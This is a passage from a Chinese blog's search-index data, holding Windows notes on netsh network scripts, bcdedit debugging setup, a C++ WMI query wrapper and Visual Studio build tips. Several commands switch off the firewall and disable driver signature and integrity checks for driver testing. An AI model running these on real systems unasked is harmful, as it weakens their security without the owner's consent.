149657Retransmitted Segments: 0In Errors: 0Out Resets: 845Fastopen Active Opens: 0Fastopen Passive Opens: 0Fastopen Attempts Failed: 0Retransmits Of First SYN: 644Retransmits Of First SYN (Fastopen): 0 二、netsh命令整理1. 导出导入脚本 导出配置脚本： 1netsh -c interface ip dump &gt; c:/interface.txt 导入配置脚本： 1netsh -f c:/interface.txt 2. 固定IP地址批处理&#x2F;&#x2F;SETIPDNS.bat（ “本地连接”换成你网卡的名字, 具体的 ip 地址，网关，请自行修改 ） 12345678910111213141516171819202122232425@echo offecho 正在修改本机IP...netsh interface ip set address name=&quot;本地连接&quot; source=static 192.168.1.188 255.255.255.0 192.168.1.1 1echo 正在添加本机主DNS...netsh interface ip set dns &quot;本地连接&quot; static 18.0.0.10 primaryecho 正在添加本机副DNS...netsh interface ip add dns &quot;本地连接&quot; 18.0.0.10echo 设置完成...echo 检查当前本机配置...ipconfig /allecho 导出配置脚本...netsh -c interface ip dumppause 3. 自动获取 IP123456789101112131415161718192021@echo offecho 正在修改本机IP...netsh interface ip set address name=&quot;本地连接&quot; source=dhcpecho 正在添加本机主DNS...netsh interface ip set dns &quot;本地连接&quot; dhcpecho 设置完成...echo 检查当前本机配置...ipconfig /allecho 导出配置脚本...netsh -c interface ip dumppause 4. netsh用法 查看网络配置 123456789101112131415161718netsh interface ip show &#123;选项&#125;&#123;选项&#125;可以是：address-显示IP地址配置。config-显示IP地址和更多信息。dns-显示DNS服务器地址。icmp-显示ICMP统计。interface-显示IP接口统计。ipaddress-显示当前IP地址。ipnet-显示IP的网络到媒体的映射。ipstats-显示IP统计。joins-显示加入的多播组。offload-显示卸载信息。tcpconn-显示TCP连接。tcpstats-显示TCP统计。udpconn-显示UDP连接。udpstats-显示UDP统计。wins-显示WINS服务器地址。 查看网络配置 123456789101112131415161718netsh interface ip show &#123;选项&#125;&#123;选项&#125;可以是：address-显示IP地址配置。config-显示IP地址和更多信息。dns-显示DNS服务器地址。icmp-显示ICMP统计。interface-显示IP接口统计。ipaddress-显示当前IP地址。ipnet-显示IP的网络到媒体的映射。ipstats-显示IP统计。joins-显示加入的多播组。offload-显示卸载信息。tcpconn-显示TCP连接。tcpstats-显示TCP统计。udpconn-显示UDP连接。udpstats-显示UDP统计。wins-显示WINS服务器地址。 配置接口IP&#x2F;网关IP 1netsh interface ip set address &quot;本地连接&quot; static 10.1.2.90 255.255.255.0 10.1.2.254 1 配置自动换取IP地址,DNS地址及wins地址 123netsh interface ip set address &quot;本地连接&quot; dhcpnetsh interface ip set dns &quot;本地连接&quot; dhcpnetsh interface ip set wins &quot;本地连接&quot; dhcp 配置静态IP地址，DNS地址及wins地址 123netsh interface ip set address &quot;本地连接&quot; static 10.1.2.90netsh interface ip set dns &quot;本地连接&quot; static 202.99.160.68netsh interface ip set wins &quot;本地连接&quot; static 10.1.2.200 看网络配置文件 1C:&gt;netsh -c interface dump 导出网络配置文件 1netsh -c interface dump &gt; d:/1.txt 导入网络配置文件 12netsh -f d:/1.txtnetsh exec d:/2.txt netsh 配置防火墙查看、开启或禁用系统防火墙 12345678# 查看防火墙的状态netsh firewall show state# 禁用系统防火墙netsh firewall set opmode disable# 启用防火墙netsh firewall set opmode enable","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"CMD","slug":"CMD","permalink":"http://example.com/tags/CMD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【cmd】bcdedit 用法整理","date":"2023-10-27T01:24:01.979Z","path":"A_OS/Windows/cmd/bcdedit/","text":"概述：bdcedit用法整理|双机调试 更多命令：https://docs.microsoft.com/zh-cn/windows-hardware/drivers/devtest/bcdedit–bootdebug [toc] 禁用数字签名1bcdedit /set testsigning on windows操作提供内核调试12bcdedit /debug on # 启动bcdedit /debug off # 禁用 windows操作系统启动项的启动调试12bcdedit /bootdebug on # 启用bcdedit /bootdebug off # 禁用 永久禁用数字签名方法 管理员CMD 输入 bcdedit.exe /set nointegritychecks on，执行完毕就结束了 如果要恢复签名，执行 bcdedit.exe /set nointegritychecks off就行 windbg和虚拟机的远程调试和网络调试设置 参考：windbg和虚拟机下的远程调试和网络调试设置_windbg调试虚拟机_satadriver的博客-CSDN博客 微软官方文档：BCDEdit &#x2F;dbgsettings - Windows drivers | Microsoft Learn WDF双机调试 参考：WDK1.2. bcdedit调试配置_bcdedit &#x2F;dbgsettings hostip_ljymoonlight的博客-CSDN博客 双机调试基本步骤网络连接虚拟机设置1234567891011# 1. 打开调试模式bcdedit /debug on# 2. 设置网络方式调试# hostip：主机IP地址# port: 主机的端口# key：(可省略) 登录密码bcdedit /dbgsettings net hostip:192.168.0.102 port:50000 key:1.2.3.4#3. 设置数字签名bcdedit /set testsigning on 主机windbg连接虚拟机如下图所示填入上述得到key或自定义设置的key之后连接即可。 串口调试 添加串行调试端口 设置管道名，并删除打印机 查看管道名 虚拟机设置 管理员cmd 依次输入以下指令 12345# 添加新的引导项bcdedit /copy &#123;current&#125; /d Debug# 设置引导项等待时间bcdedit /timeout 30 重启操作系统并再次管理员运行CMD 依次输入以下命令 12345bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200bcdedit /bootdebug onbcdedit /debug on 运行 ‘msconfig’ win+R 输入 msconfig 查看引导项是否有Debug模式 查看高级选项，调试端口和波特率 到此为止，虚拟机设置完毕，启动后操作系统启动时选择 Debug Windbg连接 连接内核 设置管道名","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"winuser说明","date":"2023-10-27T01:24:01.971Z","path":"A_OS/Windows/WinUser/winuser介绍/","text":"Winuser.h 标头 - Win32 apps | Microsoft Learn [toc] winuser 相关函数说明GetSystemMetrics GetSystemMetrics 函数 (winuser.h) - Win32 apps | Microsoft Learn 检索指定的系统指标或系统配置设置。 请注意， GetSystemMetrics 检索的所有维度都以像素为单位。 12int iconWidth = GetSystemMetrics(SM_CXSMICON); // 图标基准宽度 int iconHeight = GetSystemMetrics(SM_CYSMICON); // 图标基准高度","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"winuser","slug":"winuser","permalink":"http://example.com/tags/winuser/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"WinUser","slug":"A-OS/Windows/WinUser","permalink":"http://example.com/categories/A-OS/Windows/WinUser/"}]},{"title":"Win7 使用未签名驱动程序","date":"2023-10-27T01:24:01.970Z","path":"A_OS/Windows/【win】Win7 驱动未签名如何使用/","text":"win7使用未签名驱动程序操作具体方法如下: 1、在 win7 64 位系统上，安装某些驱动程序无法成功时，考虑禁用数字签名，重新启动计算机；这是与 XP 系统不同的地方，XP 系统没有这个功能，不用考虑禁用数字签名； 2、在电脑启动的过程中，不用等到进去输入用户登陆框，按键盘上面的按键 F8，就会出现系统启动项，供我们进行选择； 3、然后选择，禁用数字签名，启动电脑，数字签名被禁用后，驱动就能成功安装了。但是重启电脑之后，设置又会恢复成启用数字签名。有些电脑的禁用，是一次性的； 4、我们也可以强制关闭数字签名，进入系统后，使用管理员，在 CMD 运行器中，输入 bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS ；然后会出现禁用成功的提示； 5、再重启电脑，那么系统就会一直默认关闭数字签名了。安装驱动就会成功了。 以上内容就是 win7 64 位系统禁用数字签名的详细步骤，关闭数字签名后，应用程序就可以安装成功了。 可能存在的问题win7 X64 系统中对驱动程序要求有数字签名，否则无法正常使用。但有时需要用到没有数字签名的驱动程序，可正常安装后驱动是无法使用的， 具体表现如下： 1、无法自动识别硬盘控制器 使用非正版的个别操作系统光盘，在安装系统时，容易出现此错误。原因是非正版光盘自动加载的硬盘控制器驱动不符合电脑自身需要的驱动。这种情况就建议换正版光盘安装操作系统。 2、手动更新错误的驱动程序 windows操作系统正常使用，但手动更新驱动程序把硬盘控制器的驱动程序更新错误，导致此故障。解决方法是进入windows系统高级菜单，选择最后一次的正常配置，即可正常进入系统。 3、bios 设置变化后所导致 windows 操作系统正常，但是由于某些原因，用户修改了 bios 设置，导致 0x0000007b 故障。 ①如果只是一次性禁用驱动程序的认证签名，可以在开机时按 F8 键，在弹出的菜单中有 禁用驱动程序签名强制 选项，使用上下键选中之后，再按回车键确认，进入系统即可使用自己的驱动程序更新设备的驱动程序了。 ②尤其是不需要微软的签名驱动程序，还可以这样打开系统属性进行设置： 运行中输入：sysdm.cpl → 确定 ③硬件→设备安装设置 ④从不安装来自 Windows Update 的驱动程序软件→保存更改 建议：使用完毕，再改回使用 Windows Update 更新驱动选项，毕竟很多设备都需要使用微软认证签名的驱动程序。 ⑤还可以使用命令： 开始→所有程序→附件→右键命令提示符→以管理员身份运行 ⑥打开命令提示符，复制以下的命令，右键点击空白处→粘贴→在按回车键： bcdedit.exe -set loadoptions DDISABLE_INTEGRITY_CHECKS 命令正确，有操作成功完成的提示。 ⑦除此之外，还可以在组策略中进行相关设置： 开始→运行→输入： gpedit.msc 回车打开组策略编辑器。 ⑧在窗体左侧选择： 用户配置→管理模板→系统→驱动程序安装→再双击右侧窗口的 设备驱动的代码签名 策略进行设置。 ⑨点选→已启用→这里还有三个选择项：警告、忽略、组织(默认是警告)→确定","tags":[{"name":"Win7","slug":"Win7","permalink":"http://example.com/tags/Win7/"},{"name":"签名","slug":"签名","permalink":"http://example.com/tags/%E7%AD%BE%E5%90%8D/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】【wmi】ExecQuery的简单封装","date":"2023-10-27T01:24:01.970Z","path":"A_OS/Windows/WMI/WMI execquery 接口封装/","text":"概述：wmi的简单封装，主要实现查询功能，即 ExecQuery 接口 实现头文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/*************************************************************************************************** File Name : WMIInof.h** Created : 2023/10/19** Author : holdyounger** Model :** Description : simple wmi execquery***************************************************************************************************/#ifndef _WMIINFO_H_#define _WMIINFO_H_#include &lt;WbemIdl.h&gt;#pragma comment(lib,&quot;WbemUuid.lib&quot;)class CWmiInfo&#123;public: CWmiInfo(); ~CWmiInfo();public: HRESULT InitWmi(); //初始化WMI HRESULT ReleaseWmi(); //释放 /*获取一个类成员 *@param [in ] ClassName Example: &quot;Win32_Processor&quot; *@param [in ] ClassMember Example: &quot;SerialNumber&quot; *@param [out] chRetValue *@param return TRUE success; false fail Example: CString strRetValue; GetSingleItemInfo(_T(&quot;Win32_Processor&quot;),_T(&quot;Caption&quot;),strRetValue); */ BOOL GetSingleItemInfo(CString ClassName,CString ClassMember,CString &amp;chRetValue); /*获取一个类的多个成员 *@param [in ] ClassName Example: &quot;Win32_Processor&quot; *@param [in ] ClassMember Example: &quot;SerialNumber&quot; *@param [in ] n 成员个数 *@param [out] chRetValue *@param return TRUE success; false fail Example: CString strRetValue;CString [] strClassMem = &#123;_T(&quot;Caption&quot;),_T(&quot;CurrentClockSpeed&quot;),_T(&quot;DeviceID&quot;),_T(&quot;Manufacturer&quot;),_T(&quot;Manufacturer&quot;)&#125;; GetGroupItemInfo(_T(&quot;Win32_Processor&quot;),strClassMem,5,strRetValue); */ BOOL GetGroupItemInfo(CString ClassName,CString ClassMember[],int n,CString &amp;chRetValue);private: void VariantToString(const LPVARIANT,CString &amp;) const;//将Variant类型的变量转换为CStringprivate: IEnumWbemClassObject* m_pEnumClsObj; IWbemClassObject* m_pWbemClsObj; IWbemServices* m_pWbemSvc; IWbemLocator* m_pWbemLoc;&#125;;#endif 源文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268#include &quot;stdafx.h&quot;#include &quot;WmiInfo.h&quot;CWmiInfo::CWmiInfo(void)&#123; m_pWbemSvc=NULL; m_pWbemLoc=NULL; m_pEnumClsObj = NULL;&#125;CWmiInfo::~CWmiInfo(void)&#123; m_pWbemSvc=NULL; m_pWbemLoc=NULL; m_pEnumClsObj = NULL;&#125;HRESULT CWmiInfo::InitWmi()&#123; HRESULT hr; //一、初始化COM组件 //初始化COM hr=::CoInitializeEx(0,COINIT_MULTITHREADED); if (SUCCEEDED(hr) || RPC_E_CHANGED_MODE == hr) &#123; //设置进程的安全级别，（调用COM组件时在初始化COM之后要调用CoInitializeSecurity设置进程安全级别，否则会被系统识别为病毒） hr=CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL); //VERIFY(SUCCEEDED(hr)); //二、创建一个WMI命名空间连接 //创建一个CLSID_WbemLocator对象 hr=CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&amp;m_pWbemLoc);// VERIFY(SUCCEEDED(hr)); //使用m_pWbemLoc连接到&quot;root\\cimv2&quot;并设置m_pWbemSvc的指针 hr=m_pWbemLoc-&gt;ConnectServer(CComBSTR(L&quot;ROOT\\\\CIMV2&quot;), NULL, NULL, 0, NULL, 0, 0, &amp;m_pWbemSvc);// VERIFY(SUCCEEDED(hr)); //三、设置WMI连接的安全性 hr=CoSetProxyBlanket(m_pWbemSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);// VERIFY(SUCCEEDED(hr)); &#125; return(hr);&#125;HRESULT CWmiInfo::ReleaseWmi()&#123; HRESULT hr; if (NULL != m_pWbemSvc) &#123; hr=m_pWbemSvc-&gt;Release(); &#125; if (NULL != m_pWbemLoc) &#123; hr=m_pWbemLoc-&gt;Release(); &#125; if (NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); &#125; ::CoUninitialize(); return(hr);&#125;BOOL CWmiInfo::GetSingleItemInfo(CString ClassName,CString ClassMember,CString &amp;chRetValue)&#123; USES_CONVERSION; CComBSTR query(&quot;SELECT * FROM &quot;); VARIANT vtProp; ULONG uReturn; HRESULT hr; BOOL bRet = FALSE; if (NULL != m_pWbemSvc) &#123; //查询类ClassName中的所有字段,保存到m_pEnumClsObj中 query+=CComBSTR(ClassName); hr=m_pWbemSvc-&gt;ExecQuery(CComBSTR(&quot;WQL&quot;),query,WBEM_FLAG_FORWARD_ONLY|WBEM_FLAG_RETURN_IMMEDIATELY, 0,&amp;m_pEnumClsObj); if (SUCCEEDED(hr)) &#123; //初始化vtProp值 VariantInit(&amp;vtProp); uReturn=0; //返回从当前位置起的第一个对象到m_pWbemClsObj中 hr=m_pEnumClsObj-&gt;Next(WBEM_INFINITE,1,&amp;m_pWbemClsObj,&amp;uReturn); if(SUCCEEDED(hr)&amp;&amp;uReturn&gt;0) &#123; //从m_pWbemClsObj中找出ClassMember标识的成员属性值,并保存到vtProp变量中 hr=m_pWbemClsObj-&gt;Get(CComBSTR(ClassMember),0,&amp;vtProp,0,0); if (SUCCEEDED(hr)) &#123; VariantToString(&amp;vtProp,chRetValue); VariantClear(&amp;vtProp);//清空vtProp bRet = TRUE; &#125; &#125; &#125; &#125; if(NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); m_pEnumClsObj = NULL; &#125; if(NULL != m_pWbemClsObj) &#123; hr=m_pWbemClsObj-&gt;Release(); m_pWbemClsObj = NULL; &#125; return bRet;&#125;BOOL CWmiInfo::GetGroupItemInfo(CString ClassName,CString ClassMember[],int n,CString &amp;chRetValue)&#123; USES_CONVERSION; CComBSTR query(&quot;SELECT * FROM &quot;); CString result,info; VARIANT vtProp; ULONG uReturn; HRESULT hr; int i; BOOL bRet = FALSE; if (NULL != m_pWbemSvc) &#123; query+=CComBSTR(ClassName); hr=m_pWbemSvc-&gt;ExecQuery(CComBSTR(&quot;WQL&quot;),query,WBEM_FLAG_FORWARD_ONLY|WBEM_FLAG_RETURN_IMMEDIATELY,0,&amp;m_pEnumClsObj); if (SUCCEEDED(hr)) &#123; VariantInit(&amp;vtProp); //初始化vtProp变量 if(m_pEnumClsObj) &#123; Sleep(10); uReturn=0; hr=m_pEnumClsObj-&gt;Next(WBEM_INFINITE,1,&amp;m_pWbemClsObj,&amp;uReturn); if (SUCCEEDED(hr) &amp;&amp;uReturn&gt;0) &#123; for(i=0;i&lt;n;++i) &#123; hr=m_pWbemClsObj-&gt;Get(CComBSTR(ClassMember[i]),0,&amp;vtProp,0,0); if (SUCCEEDED(hr)) &#123; VariantToString(&amp;vtProp,info); chRetValue+=info+_T(&quot;\\t&quot;); VariantClear(&amp;vtProp); bRet = TRUE; &#125; &#125; chRetValue+=_T(&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; if(NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); m_pEnumClsObj=NULL; &#125; if(NULL != m_pWbemClsObj) &#123; hr=m_pWbemClsObj-&gt;Release(); m_pWbemClsObj=NULL; &#125; return bRet;&#125;void CWmiInfo::VariantToString(const LPVARIANT pVar,CString &amp;chRetValue) const&#123; USES_CONVERSION; CComBSTR HUGEP* pBstr; BYTE HUGEP* pBuf; LONG low,high,i; HRESULT hr; switch(pVar-&gt;vt) &#123; case VT_BSTR: &#123; chRetValue=W2T(pVar-&gt;bstrVal); &#125; break; case VT_BOOL: &#123; if(VARIANT_TRUE==pVar-&gt;boolVal) chRetValue=&quot;是&quot;; else chRetValue=&quot;否&quot;; &#125; break; case VT_I4: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;lVal); &#125; break; case VT_UI1: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;bVal); &#125; break; case VT_UI4: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;ulVal); &#125; break; case VT_BSTR|VT_ARRAY: &#123; hr=SafeArrayAccessData(pVar-&gt;parray,(void HUGEP**)&amp;pBstr); hr=SafeArrayUnaccessData(pVar-&gt;parray); chRetValue=W2T(pBstr-&gt;m_str); &#125; break; case VT_I4|VT_ARRAY: &#123; SafeArrayGetLBound(pVar-&gt;parray,1,&amp;low); SafeArrayGetUBound(pVar-&gt;parray,1,&amp;high); hr=SafeArrayAccessData(pVar-&gt;parray,(void HUGEP**)&amp;pBuf); hr=SafeArrayUnaccessData(pVar-&gt;parray); CString strTmp; high=min(high,MAX_PATH*2-1); for(i=low;i&lt;=high;++i) &#123; strTmp.Format(_T(&quot;%02X&quot;),pBuf[i]); chRetValue+=strTmp; &#125; &#125; break; default: break; &#125;&#125; 使用1","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"wmi","slug":"wmi","permalink":"http://example.com/tags/wmi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"WMI","slug":"A-OS/Windows/WMI","permalink":"http://example.com/categories/A-OS/Windows/WMI/"}]},{"title":"【Visual Studio】C++ 常见错误——无法解析的外部符号","date":"2023-10-27T01:24:01.969Z","path":"A_OS/Windows/Visual Studio/无法解析的外部符号错误处理/","text":"关于C++常见错误“无法解析的外部符号”这一问题如何解决的思考与方法。 本文就使用libevent中遇到的相似问题着手进行分析该如何解决，其他情况仍需按实际情况进行分析处理。常见的原因无外乎缺少编译库。 如上图所示，报错为无法解析的外部符号，符号为 __imp__if_nametoindex@4， 一般这种符号就是缺少导出的接口，导出接口一般为 函数名@导出序号。基本可以确定是缺少一个链接库。其次 出现字符_imp，说明不是真正的静态库，而是某个动态库的导入库，导入函数和自己不同名，所以加了字符_imp。这里可以确定导出函数名为 if_nametoindex； 确定了导出函数名为 if_nametoindex 之后，可以百度查看一下有没有相关函数的信息； 一搜发现为windows系统函数，是网络相关的接口函数，负责将ANSI接口转换为接口的本地索引。其声明需要包含的静态库文件为 Netio.lib。但是笔者这边测试之后发现无法打开 Netio.lib 这个静态库，再查找，找到其相关索引为 IP Helper Functions。 至此，基本上可以确定其缺少的静态库和网络部分相关，找到相关函数（这里查看的函数为 AddIPAddress），查看其函数使用要求，需要引用 Iphlpapi.lib，引入到代码中，编译成功。","tags":[{"name":"整理","slug":"整理","permalink":"http://example.com/tags/%E6%95%B4%E7%90%86/"},{"name":"思考","slug":"思考","permalink":"http://example.com/tags/%E6%80%9D%E8%80%83/"},{"name":"错误","slug":"错误","permalink":"http://example.com/tags/%E9%94%99%E8%AF%AF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【Visual Studio】如何让控制台程序不显示界面","date":"2023-10-27T01:24:01.967Z","path":"A_OS/Windows/Visual Studio/控制台程序不显示界面/","text":"[toc] windows控制台程序不显示界面的几种方式要使Windows控制台程序在后台运行，而不显示界面，可以使用以下几种方法： 1. 更改程序的后缀名将程序的后缀名修改为.com或者.pif，这会导致程序在后台运行时不显示控制台窗口。 2. 修改程序的子系统使用Visual Studio等开发工具，将程序的子系统修改为Windows而不是Console。这样可以使程序在后台以窗口应用程序的形式运行。具体步骤如下： 打开项目的属性（右键项目 -&gt; 属性）。 切换到“配置属性” -&gt; “链接器” -&gt; “系统”。 修改“子系统”属性为“Windows (&#x2F;SUBSYSTEM:WINDOWS)”。 编译和运行项目。 使用此方式可能会使程序编译报错： 12错误 LNK2001 无法解析的外部符号 _WinMain@16fatal error LNK1120: 1 个无法解析的外部命令 需要在文件中添加以下代码： 12// 设置连接器选项#pragma comment(linker, &quot;/entry:mainCRTStartup&quot;) 使用第三方工具可以使用第三方工具将控制台程序包装成无界面的应用程序。例如，可以使用nssm（Non-Sucking Service Manager）工具将控制台程序安装为服务，并设置该服务在后台运行而不显示界面。 以上是几种常用的方法，可以根据具体需求选择适合的方式来实现控制台程序在后台运行而不显示界面。","tags":[{"name":"visual studio","slug":"visual-studio","permalink":"http://example.com/tags/visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【Visual Studio】内置引入文件","date":"2023-10-27T01:24:01.967Z","path":"A_OS/Windows/Visual Studio/文件内置引入/","text":"概述：介绍了如何使用 visual studio 引入默认的库文件和头文件 在用户目录下有这样一个文件，路径为 C:\\Users\\用户名\\AppData\\Local\\Microsoft\\MSBuild\\v4.0 Microsoft.Cpp.*.user.props 该文件用于定义用户自己需要定义的一些配置。 查看内容如下所示： 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;Project DefaultTargets=&quot;Build&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt; &lt;ImportGroup Label=&quot;PropertySheets&quot;&gt; &lt;/ImportGroup&gt; &lt;PropertyGroup Label=&quot;UserMacros&quot; /&gt; &lt;PropertyGroup&gt; &lt;IncludePath&gt;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include\\360safe\\360NewExamine;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\include\\SiteUI;D:\\Documents\\A_Source\\CWPP\\360LPUB\\opensource\\VC-LTL4;$(ProjectDir);$(IncludePath) &lt;/IncludePath&gt; &lt;LibraryPath&gt;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\lib_s3;D:\\Documents\\A_Source\\CWPP\\360GPUBNew\\dev\\lib_s3\\vc2017;D:\\Documents\\A_Source\\CWPP\\360LPUB\\dev\\lib\\360netmon;$(LibraryPath)&lt;/LibraryPath&gt; &lt;/PropertyGroup&gt; &lt;ItemDefinitionGroup /&gt; &lt;ItemGroup /&gt;&lt;/Project&gt; 其中： IncludePath：即为需要包含的头文件目录 LibraryPath：为需要引入库文件的目录 其他编译版本同理","tags":[{"name":"visual studio","slug":"visual-studio","permalink":"http://example.com/tags/visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【Visual Studio】Visual Studio中MD与MT的区别及运行库类型选择","date":"2023-10-27T01:24:01.957Z","path":"A_OS/Windows/Visual Studio/VisualStudio中MD与MT的区别及运行库类型选择/","text":"[toc] 本篇主要总结一下自己在项目开发过程中经常遇到的一个问题，即Visual Studio编译过程中如何选择运行库的类型。希望对其它开发的伙伴们有一定的参考价值和帮助。 1.在Visual Studio中设置在Visual Studio 2019中，右键项目名称，打开项目属性页，选择“配置属性”-&gt;“C&#x2F;C++”-&gt;“代码生成”-&gt;“运行库”即可对运行库类型进行设置，如下图所示。 这里运行库类型主要包含四种：多线程(&#x2F;MT)、多线程调试(&#x2F;MTd)、多线程DLL(&#x2F;MD)、多线程调试(&#x2F;MDd)。其中带有d的类型是项目的调试版本，不带有d的类型是项目的Release版本。 2. MT与MD的区别 /MT：是multithread-static version，是多线程静态版本的意思，项目会使用运行时库的多线程静态版本，编译器会将LIBCMT.lib放入.obj文件中，以便链接器使用LIBCMT.lib解析外部符号； /MTd：是定义了_DEBUG和/MT，是/MT类型的debug版本； /MD：是multithread-dll version，是多线程dll版本的意思，项目会使用运行时库的多线程动态dll版本，编译器会将MSVCRT.lib放入.obj文件中，在编译项目时，它会静态链接MSVCRT.lib，但在实际运行过程中，它会链接使用MSVCR90.dll； MDd：是定义了_DEBUG和/MD，是/MD类型的debug版本； 因此，我们在编译时，对应的库一定要配套一致。比如你用CMake生成工程文件时，若CMake是用/MT类型生成的，则它所调用的运行时库为LIBCMT.lib；后面生成工程时，你必须也选择/MT类型，否则你选择/MD类型的话，工程在链接时会调用MSVCRT.lib和MSVCR90.dll，显然两次调用不同的运行时库，会出现重定义的错误。 总起来说，/MD类型表示运行时库不集成，生成的文件小，程序运行时动态加载对应的dll；/MT类型表示运行时库集成，生成的文件较大，在链接时将C/C++运行时库集成到程序中。 3. 使用在使用过程中，如果Release模式下使用MD编译的文件报错缺少 MSVCD140。dll，则可以使用 MT 选项编译，解决缺少动态库的问题。","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【Visual Studio】Visual Studio 通用配置","date":"2023-10-27T01:24:01.956Z","path":"A_OS/Windows/Visual Studio/Visual Stdio 通用配置/","text":"工具集1$(DefaultPlatformToolset) SDK1$([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) Qt 版本需要设置注册表项，值为Qt安装路径 1$(QtPath) 生成事件1call $(SolutionDir)prompt.bat prompt.bat 123456789101112131415@echo offecho -----------------------------------------------------echo [TrustAgent.pro] 文件有更新时，请重新生成当前工程echo 以下配置并不适用于所有人，如有编译报错，请自行修改。echo 1. Qt工具集默认配置为环境变量QtPath: 当前系统QtPath:[%QtPath%] （推荐 5.9.9_msvc2015）echo 2. 工具集默认配置为: $(DefaultPlatformToolset) （推荐 10.0.19041.0及以上）echo 3. SDK默认配置为: $([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) （推荐 V142）echo -----------------------------------------------------@REM if &quot;%QtPath%&quot; == &quot;&quot; (@REM choice /c:yn /m &quot;当前未配置环境变量，是否打开系统配置页面：&quot;@REM if %errorlevel%==1 (@REM start ms-settings:about@REM )@REM )","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"Visual 